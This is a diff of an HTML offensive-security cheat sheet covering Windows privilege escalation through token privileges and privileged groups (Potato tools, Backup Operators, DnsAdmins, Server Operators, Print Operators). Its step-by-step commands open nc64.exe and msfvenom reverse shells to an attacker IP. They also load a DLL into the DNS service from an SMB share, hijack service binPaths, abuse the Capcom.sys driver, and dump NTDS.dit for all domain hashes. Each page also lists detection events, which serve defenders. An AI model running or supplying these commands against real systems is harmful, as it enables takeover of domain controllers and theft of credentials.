+            <div class="step-content">
+              <div class="step-title">Trigger the service write (restart it or wait for schedule)</div>
+              <div class="code-block">sc stop VulnerableService
+sc start VulnerableService
+# SYSTEM service now writes its file through your symlink into System32</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: Direct DLL placement if C:\ write is available</div>
+              <div class="code-block purple"># If you have write to a path in the DLL search order:
+# Create symlink from DLL search path location → your malicious DLL
+cmd /c mklink "C:\Python39\version.dll" "C:\Temp\evil.dll"
+# When Python (or a SYSTEM app) starts, it loads your DLL</div>
             </div>
           </div>
           <div class="alert alert-gold">
             <span class="alert-icon">💡</span>
-            <span>This is most powerful when chained with a service that writes predictably to a user-controlled path. Look for services writing logs to temp folders.</span>
+            <span><strong>Best targets:</strong> Services writing log files to <code>C:\ProgramData\</code>, <code>C:\Temp\</code>, or any path writable by your user. Use Procmon with a SYSTEM filter to map write operations quickly.</span>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>WSL note:</strong> This privilege is granted to all users on systems with WSL enabled (needed for WSL filesystem operations). Check with <code>whoami /priv</code> — it may already be present.</span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4663 — symlink creation (file system audit) • mklink.exe / New-Item SymbolicLink in process creation logs • Unexpected write targets (symlink dereferenced) in file audit • Sysmon Event 11 — FileCreate with reparse point flag</div>
       </div>
     </div>
 
@@ -1517,25 +2567,79 @@ sc start VulnerableService</div>
     <!-- SeAssignPrimaryToken -->
     <div id="page-seassignprimary" class="page">
       <div class="page-header">
-        <div class="page-title">🎫 SeAssignPrimaryTokenPrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
-        <div class="page-sub">// REPLACE PROCESS TOKEN → POTATO FAMILY → SYSTEM</div>
+        <div class="page-title">&#127243; SeAssignPrimaryTokenPrivilege <span class="severity-badge sev-critical">CRITICAL</span></div>
+        <div class="page-sub">// REPLACE PROCESS TOKEN &rarr; POTATO FAMILY &rarr; SYSTEM</div>
       </div>
       <div class="info-grid">
-        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Service accounts (often alongside SeImpersonate)</div></div>
-        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Potato family (same as SeImpersonate)</div></div>
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Service accounts (IIS, MSSQL); usually present alongside SeImpersonatePrivilege</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Potato family (same arsenal as SeImpersonate)</div></div>
         <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">API</div><div class="info-value">CreateProcessAsUser (vs CreateProcessWithTokenW for SeImpersonate)</div></div>
       </div>
+
+      <div class="alert alert-gold">
+        <span class="alert-icon">&#9733;</span>
+        <span><strong>SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege together</strong> = every Potato attack works. If only <em>one</em> is present, run FullPowers first to recover both. SeAssignPrimaryToken alone uses <strong>CreateProcessAsUser</strong> (vs <strong>CreateProcessWithTokenW</strong> for SeImpersonate), but the potato tooling handles this automatically.</span>
+      </div>
+
       <div class="section">
-        <div class="section-header">⚡ Same Arsenal as SeImpersonate</div>
+        <div class="section-header">&#9889; Same Full Arsenal as SeImpersonatePrivilege</div>
         <div class="section-body">
-          <div class="code-block green">.\GodPotato-NET4.exe -cmd "cmd /c nc64.exe 192.168.45.250 4444 -e cmd"
-.\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c nc64.exe 192.168.45.250 4444 -e cmd"
-.\PrintSpoofer.exe -c "nc64.exe 192.168.45.250 4444 -e cmd"</div>
-          <div class="alert alert-teal">
-            <span class="alert-icon">💡</span>
-            <span>SeAssignPrimaryTokenPrivilege + SeImpersonatePrivilege together = every Potato attack works. Check FullPowers if one is missing.</span>
+          <div class="alert alert-red">
+            <span class="alert-icon">!</span>
+            <span>See the <strong>SeImpersonatePrivilege page</strong> for complete step-by-step instructions for all tools. All potatoes below apply identically. If you have SeAssignPrimaryToken but <em>NOT</em> SeImpersonate, note the JuicyPotatoNG flag difference below.</span>
+          </div>
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">GodPotato (best all-round)</div>
+              <div class="code-block green">.\GodPotato-NET4.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">JuicyPotatoNG &mdash; if ONLY SeAssignPrimaryToken (no SeImpersonate), use -t u</div>
+              <div class="code-block green">REM Both privileges present (normal case):
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+REM SeAssignPrimaryToken ONLY (no SeImpersonate) -- force CreateProcessAsUser:
+.\JuicyPotatoNG.exe -t u -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">PrintSpoofer (Spooler must be running)</div>
+              <div class="code-block green">.\PrintSpoofer64.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">SigmaPotato (no Spooler; Win8&ndash;Win11 / Server 2012&ndash;2022)</div>
+              <div class="code-block green">.\SigmaPotato.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">SweetPotato EfsRpc (no Spooler)</div>
+              <div class="code-block green">.\SweetPotato.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">FullPowers (if LOCAL/NETWORK SERVICE &mdash; run first)</div>
+              <div class="code-block green">.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z</div>
+            </div>
           </div>
         </div>
+      </div>
+
+      <div class="detection-box">
+        <div class="detection-title">&#128269; Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Same as SeImpersonatePrivilege &bull; Event 4672 &rarr; SYSTEM logon &bull; Event 4688 &rarr; service worker spawning cmd.exe &bull; CreateProcessAsUser calls from non-SYSTEM service accounts &bull; Unusual primary token assignment on process creation</div>
       </div>
     </div>
 
@@ -1543,39 +2647,100 @@ sc start VulnerableService</div>
     <div id="page-backupops" class="page">
       <div class="page-header">
         <div class="page-title">👥 Backup Operators Group <span class="severity-badge sev-rare">RARE</span></div>
-        <div class="page-sub">// MEMBERSHIP → SeBackup + SeRestore → NTDS.DIT → ALL HASHES</div>
+        <div class="page-sub">// MEMBERSHIP → SeBackupPrivilege + SeRestorePrivilege → NTDS.DIT → ALL DOMAIN HASHES</div>
       </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Privileges Granted</div><div class="info-value">SeBackupPrivilege + SeRestorePrivilege (automatically)</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">NTDS.dit dump via VSS/diskshadow (same as SeBackupPrivilege)</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">All domain NTLM hashes → Domain Admin via PTH</div></div>
+        <div class="info-card"><div class="info-label">Critical Caveat</div><div class="info-value">Evil-WinRM STRIPS these privileges — use native PSRemoting</div></div>
+      </div>
+
+      <div class="alert alert-red">
+        <span class="alert-icon">🔴</span>
+        <span><strong>CRITICAL — Evil-WinRM strips SeBackupPrivilege and SeRestorePrivilege from your token!</strong> If you landed via Evil-WinRM, your privileges will show as Disabled or absent. You MUST use a native PSRemoting or winrs session to retain them.</span>
+      </div>
+
       <div class="section">
         <div class="section-header">⚡ Full Attack Chain</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">Backup Operators membership</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Native PSRemoting (not Evil-WinRM)</div><div class="flow-arrow">→</div>
+            <div class="flow-node">diskshadow VSS snapshot</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Copy NTDS.dit</div><div class="flow-arrow">→</div>
+            <div class="flow-node">secretsdump → All hashes</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Check if in group</div>
+              <div class="step-title">Confirm group membership and privileges</div>
               <div class="code-block">net localgroup "Backup Operators"
-whoami /groups | findstr /i backup</div>
+whoami /groups | findstr /i backup
+whoami /priv | findstr /i "SeBackup\|SeRestore"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Note: Evil-WinRM strips privileges — use PSRemoting instead</div>
-              <div class="code-block gold">$sess = New-PSSession -ComputerName localhost -Credential (Get-Credential)
-Enter-PSSession $sess</div>
+              <div class="step-title">If via Evil-WinRM: switch to native PSRemoting to preserve privileges</div>
+              <div class="code-block orange"># From your current Evil-WinRM shell or any foothold, spawn a proper PSRemoting session:
+$cred = New-Object System.Management.Automation.PSCredential("{{WPATH}}\username", (ConvertTo-SecureString "password" -AsPlainText -Force))
+$sess = New-PSSession -ComputerName localhost -Credential $cred
+Enter-PSSession $sess
+# Now verify privileges are present and Enabled:
+whoami /priv</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Then follow SeBackupPrivilege chain → NTDS.dit steal</div>
-              <div class="code-block"># See SeBackupPrivilege page for full steps</div>
+              <div class="step-title">Alternative: use winrs (simpler, same effect)</div>
+              <div class="code-block">winrs -r:{{WPATH}} -u:username -p:password "whoami /priv"
+winrs -r:{{WPATH}} -u:username -p:password cmd</div>
             </div>
           </div>
-          <div class="alert alert-critical">
-            <span class="alert-icon">🔴</span>
-            <span>Evil-WinRM removes SeBackupPrivilege and SeRestorePrivilege from your token! Use a native PSRemoting session to retain them.</span>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Follow SeBackupPrivilege chain — NTDS.dit via diskshadow</div>
+              <div class="code-block purple"># Create VSS script:
+echo "set context persistent nowriters" > C:\Temp\pwn.dsh
+echo "add volume c: alias pwn" >> C:\Temp\pwn.dsh
+echo "create" >> C:\Temp\pwn.dsh
+echo "expose %pwn% z:" >> C:\Temp\pwn.dsh
+unix2dos C:\Temp\pwn.dsh   # or use notepad to ensure proper line endings
+
+diskshadow.exe /s C:\Temp\pwn.dsh</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Copy NTDS.dit using SeBackupPrivilege cmdlets</div>
+              <div class="code-block purple">Import-Module .\SeBackupPrivilegeCmdLets.dll
+Import-Module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
+reg save HKLM\SYSTEM C:\Temp\system</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Exfil and dump on Kali</div>
+              <div class="code-block green">impacket-secretsdump -ntds ntds.dit -system system LOCAL
+# → All domain NTLM hashes → PTH as Domain Admin</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>SeBackupPrivilege cmdlets: <a href="https://github.com/giuliano108/SeBackupPrivilege" target="_blank">github.com/giuliano108/SeBackupPrivilege</a></span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">VSS snapshot creation (Event 8222) • diskshadow.exe execution • NTDS.dit file access • SeBackupPrivilege used on domain controller • PSRemoting session from non-admin to DC (Event 4624 type 3)</div>
       </div>
     </div>
 
@@ -1583,53 +2748,101 @@ Enter-PSSession $sess</div>
     <div id="page-dnsadmins" class="page">
       <div class="page-header">
         <div class="page-title">🌐 DnsAdmins → SYSTEM <span class="severity-badge sev-rare">RARE</span></div>
-        <div class="page-sub">// DnsAdmins GROUP → LOAD DLL IN DNS SERVICE → SYSTEM ON DC</div>
+        <div class="page-sub">// DnsAdmins GROUP → LOAD DLL IN DNS SERVICE (SYSTEM) → SYSTEM SHELL ON DC</div>
       </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">DnsAdmins domain group members</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">dnscmd → ServerLevelPluginDll → load evil DLL in dns.exe (SYSTEM)</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM on the Domain Controller</div></div>
+        <div class="info-card"><div class="info-label">Requires</div><div class="info-value">DnsAdmins membership + ability to restart DNS service</div></div>
+      </div>
+
+      <div class="alert alert-red">
+        <span class="alert-icon">🔴</span>
+        <span><strong>DNS restart causes ~60 second service outage</strong> on the DC. All DNS resolution across the domain will fail during this window. Coordinate carefully on real engagements — this is highly visible.</span>
+      </div>
+
       <div class="section">
-        <div class="section-header">⚡ Full Attack</div>
+        <div class="section-header">⚡ Full Attack Chain</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">DnsAdmins membership</div><div class="flow-arrow">→</div>
+            <div class="flow-node">msfvenom DLL</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SMB host DLL</div><div class="flow-arrow">→</div>
+            <div class="flow-node">dnscmd → PluginDll reg</div><div class="flow-arrow">→</div>
+            <div class="flow-node">sc restart dns</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM shell</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Check membership</div>
-              <div class="code-block">net localgroup DnsAdmins</div>
+              <div class="step-title">Confirm DnsAdmins membership</div>
+              <div class="code-block">net group DnsAdmins /domain
+whoami /groups | findstr /i dns</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Generate malicious DLL on Kali</div>
-              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=4444 -f dll -o evil.dll</div>
+              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o evil.dll</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Host on SMB share or local path</div>
-              <div class="code-block">impacket-smbserver share . -smb2support</div>
+              <div class="step-title">Start SMB server on Kali to host the DLL</div>
+              <div class="code-block">impacket-smbserver share . -smb2support
+# DLL will be loaded from \\{{KALI_IP}}\share\evil.dll</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
-              <div class="step-title">Configure DNS server to load your DLL</div>
-              <div class="code-block purple">dnscmd dc01 /config /serverlevelplugindll \\192.168.45.250\share\evil.dll
-# Replace "dc01" with the DC hostname; omit if running directly on the DC</div>
+              <div class="step-title">Start nc listener on Kali</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">5</div>
             <div class="step-content">
-              <div class="step-title">Restart DNS service (requires membership)</div>
-              <div class="code-block">sc stop dns
-sc start dns</div>
+              <div class="step-title">Configure DNS server plugin DLL via dnscmd (MUST include DC hostname)</div>
+              <div class="code-block purple">dnscmd dc01 /config /serverlevelplugindll \\{{KALI_IP}}\share\evil.dll
+# IMPORTANT: "dc01" = your DC's hostname (use: nslookup or net group "Domain Controllers" /domain)
+# Only omit the hostname if running this command DIRECTLY on the DC itself
+# Verify setting was applied:
+Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters -Name ServerLevelPluginDll</div>
             </div>
           </div>
-          <div class="alert alert-critical">
-            <span class="alert-icon">🔴</span>
-            <span>DNS restart will cause ~60s outage in a real environment. Avoid in production.</span>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Restart DNS service — shell arrives on listener</div>
+              <div class="code-block orange">sc stop dns
+sc start dns
+# ~60 second DNS outage occurs here — shell arrives as SYSTEM</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">7</div>
+            <div class="step-content">
+              <div class="step-title">Cleanup — remove the plugin DLL setting after exploitation</div>
+              <div class="code-block">dnscmd dc01 /config /serverlevelplugindll ""
+sc stop dns
+sc start dns
+# Or delete the registry key directly:
+reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll /f</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">🔗</span>
+            <span>Reference: <a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank">ired.team — DnsAdmins to SYSTEM</a></span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">dnscmd.exe with /serverlevelplugindll argument • Registry write to HKLM\SYSTEM\...\DNS\Parameters\ServerLevelPluginDll • DNS service restart (Event 7036) • Outbound SMB from dns.exe (Event 5156) • DLL loaded from UNC path by dns.exe (Sysmon Event 7)</div>
       </div>
     </div>
 
@@ -1637,40 +2850,85 @@ sc start dns</div>
     <div id="page-serverops" class="page">
       <div class="page-header">
         <div class="page-title">🖥️ Server Operators Group <span class="severity-badge sev-rare">RARE</span></div>
-        <div class="page-sub">// SERVICE MANAGEMENT RIGHTS → MODIFY BINPATH → SYSTEM</div>
+        <div class="page-sub">// SERVICE MANAGEMENT RIGHTS → MODIFY SERVICE BINPATH → SYSTEM REVERSE SHELL</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Server Operators domain group members</div></div>
+        <div class="info-card"><div class="info-label">Privileges</div><div class="info-value">SeLoadDriverPrivilege + can start/stop/configure services</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Modify any SYSTEM service binPath → reverse shell on start</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
       </div>
       <div class="section">
-        <div class="section-header">⚡ Full Attack</div>
+        <div class="section-header">⚡ Full Attack — binPath hijack</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">Server Operators member</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Find SYSTEM service</div><div class="flow-arrow">→</div>
+            <div class="flow-node">sc config binPath=</div><div class="flow-arrow">→</div>
+            <div class="flow-node">sc stop / sc start</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM shell</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Check membership</div>
-              <div class="code-block">net localgroup "Server Operators"</div>
+              <div class="step-title">Confirm Server Operators membership</div>
+              <div class="code-block">net localgroup "Server Operators"
+whoami /groups | findstr /i "server op"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Find a service running as SYSTEM</div>
-              <div class="code-block">sc query
-services.msc → find any running as LocalSystem</div>
+              <div class="step-title">Find services running as LocalSystem (SYSTEM)</div>
+              <div class="code-block">wmic service where "StartName='LocalSystem'" get Name,PathName,State
+sc qc AppMgmt   # Verify: SERVICE_START_NAME = LocalSystem</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
-              <div class="step-title">Modify service binpath to reverse shell</div>
-              <div class="code-block purple">sc config AppMgmt binPath= "cmd /c C:\Users\Public\Documents\nc64.exe 192.168.45.250 4444 -e cmd"
+              <div class="step-title">Transfer nc64.exe to target</div>
+              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/nc64.exe -OutFile C:\Temp\nc64.exe</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Start nc listener on Kali</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Modify service binPath to reverse shell — NOTE: space after binPath= is REQUIRED</div>
+              <div class="code-block purple">sc config AppMgmt binPath= "cmd /c C:\Temp\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
+# ^^^ The space after "binPath=" is MANDATORY — sc.exe syntax requires it
 sc stop AppMgmt
 sc start AppMgmt</div>
             </div>
           </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Cleanup — restore original binPath after getting shell</div>
+              <div class="code-block">sc config AppMgmt binPath= "C:\Windows\system32\dllhost.exe /ProcessID:{02D4B3F1-FD88-11D1-960D-00805FC79235}"
+sc start AppMgmt</div>
+            </div>
+          </div>
+          <div class="alert alert-red">
+            <span class="alert-icon">🔴</span>
+            <span><strong>sc.exe syntax quirk:</strong> There MUST be a space between <code>binPath=</code> and the value string. <code>sc config svc binPath="..."</code> (no space) will FAIL silently or produce an error. Always use <code>binPath= "..."</code>.</span>
+          </div>
           <div class="alert alert-gold">
             <span class="alert-icon">💡</span>
-            <span>Server Operators can start/stop services even without explicit sc permissions. Any SYSTEM service is a target.</span>
+            <span>Server Operators can start and stop services without needing explicit ACL grants. Good targets: AppMgmt, Browser, Dhcp, EventLog, LanmanServer, Schedule, SENS, Spooler, W32Time.</span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 7040 — service binPath changed • Event 7036 — service state change • sc.exe with config argument • Unexpected nc64.exe or cmd.exe as service ImagePath • Service started then stopped quickly (shell caught)</div>
       </div>
     </div>
 
@@ -1678,32 +2936,89 @@ sc start AppMgmt</div>
     <div id="page-printops" class="page">
       <div class="page-header">
         <div class="page-title">🖨️ Print Operators Group <span class="severity-badge sev-rare">RARE</span></div>
-        <div class="page-sub">// SeLoadDriverPrivilege + SeShutdown → KERNEL DRIVER → SYSTEM</div>
+        <div class="page-sub">// SeLoadDriverPrivilege + SeShutdownPrivilege → LOAD VULNERABLE KERNEL DRIVER → SYSTEM</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Privileges Granted</div><div class="info-value">SeLoadDriverPrivilege + SeShutdownPrivilege (automatically)</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">EOPLOADDRIVER + vulnerable driver (Capcom.sys) → kernel exploit</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">NT AUTHORITY\SYSTEM</div></div>
+        <div class="info-card"><div class="info-label">Full Path</div><div class="info-value">Same as SeLoadDriverPrivilege page — see that section for complete steps</div></div>
       </div>
       <div class="section">
-        <div class="section-header">⚡ Attack</div>
+        <div class="section-header">⚡ Full Attack — Vulnerable Driver via EOPLOADDRIVER</div>
         <div class="section-body">
+          <div class="flow-chain">
+            <div class="flow-node">Print Operators member</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SeLoadDriverPrivilege enabled</div><div class="flow-arrow">→</div>
+            <div class="flow-node">EOPLOADDRIVER.exe</div><div class="flow-arrow">→</div>
+            <div class="flow-node">Load Capcom.sys</div><div class="flow-arrow">→</div>
+            <div class="flow-node">ExploitCapcom.exe</div><div class="flow-arrow">→</div>
+            <div class="flow-node">SYSTEM</div>
+          </div>
           <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
-              <div class="step-title">Print Operators get SeLoadDriverPrivilege — follow SeLoadDriver chain</div>
+              <div class="step-title">Confirm membership and privileges</div>
               <div class="code-block">net localgroup "Print Operators"
-whoami /priv | findstr SeLoadDriver</div>
+whoami /priv | findstr /i "SeLoadDriver\|SeShutdown"
+# SeLoadDriverPrivilege should show Enabled (or can be enabled)</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
-              <div class="step-title">Load vulnerable driver → kernel exploit</div>
-              <div class="code-block purple">.\EOPLOADDRIVER.exe System\CurrentControlSet\MyService C:\temp\Capcom.sys
-.\ExploitCapcom.exe EXPLOITPATH C:\temp\shell.exe</div>
+              <div class="step-title">Transfer tools to target</div>
+              <div class="code-block">iwr http://{{KALI_IP}}:{{PORT}}/eoploaddriver_x64.exe -OutFile C:\Temp\eoploaddriver_x64.exe
+iwr http://{{KALI_IP}}:{{PORT}}/Capcom.sys -OutFile C:\Temp\Capcom.sys
+iwr http://{{KALI_IP}}:{{PORT}}/ExploitCapcom.exe -OutFile C:\Temp\ExploitCapcom.exe</div>
             </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Load the vulnerable Capcom.sys driver via eoploaddriver_x64</div>
+              <div class="code-block purple">.\eoploaddriver_x64.exe System\CurrentControlSet\MyService C:\Temp\Capcom.sys
+# Expected output: "[+] Enabling SeLoadDriverPrivilege"
+#                  "[+] SeLoadDriverPrivilege Enabled"
+#                  "[+] Loading Driver: \Registry\Machine\System\CurrentControlSet\MyService"
+#                  "NTSTATUS: 00000000, WinError: 0"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Start nc listener on Kali</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Exploit Capcom driver to run shell.exe as SYSTEM</div>
+              <div class="code-block purple">.\ExploitCapcom.exe EXPLOIT "C:\Temp\shell.exe"
+# EXPLOIT "<cmd>" syntax — works with k4sth4/SeLoadDriverPrivilege precompiled build</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">6</div>
+            <div class="step-content">
+              <div class="step-title">Generate shell.exe on Kali (if using msfvenom payload)</div>
+              <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f exe -o shell.exe</div>
+            </div>
+          </div>
+          <div class="alert alert-gold">
+            <span class="alert-icon">💡</span>
+            <span><strong>SeLoadDriverPrivilege may be disabled by default</strong> even if listed. EOPLOADDRIVER.exe handles enabling it automatically before loading the driver.</span>
           </div>
           <div class="alert alert-teal">
             <span class="alert-icon">🔗</span>
-            <span>Reference: <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com — SeLoadDriverPrivilege</a></span>
+            <span>EOPLOADDRIVER: <a href="https://github.com/TarlogicSecurity/EoPLoadDriver" target="_blank">github.com/TarlogicSecurity/EoPLoadDriver</a> | Reference: <a href="https://www.tarlogic.com/blog/seloaddriverprivilege-privilege-escalation/" target="_blank">tarlogic.com — SeLoadDriverPrivilege</a></span>
           </div>
         </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 6 (Sysmon) — driver loaded • EOPLOADDRIVER.exe process creation • Capcom.sys or other known-vulnerable driver hash • Registry key creation under HKLM\SYSTEM\CurrentControlSet\Services\ by non-admin • SeLoadDriverPrivilege used (Event 4673)</div>
       </div>
     </div>
 
@@ -1726,7 +3041,7 @@ whoami /priv | findstr SeLoadDriver</div>
               <div class="step-title">Run FullPowers to restore tokens</div>
               <div class="code-block green">.\FullPowers.exe
 .\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c whoami'"
-.\FullPowers.exe -c "C:\Users\Public\nc64.exe 192.168.45.250 4444 -e cmd" -z</div>
+.\FullPowers.exe -c "C:\Users\Public\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</div>
             </div>
           </div>
           <div class="step">
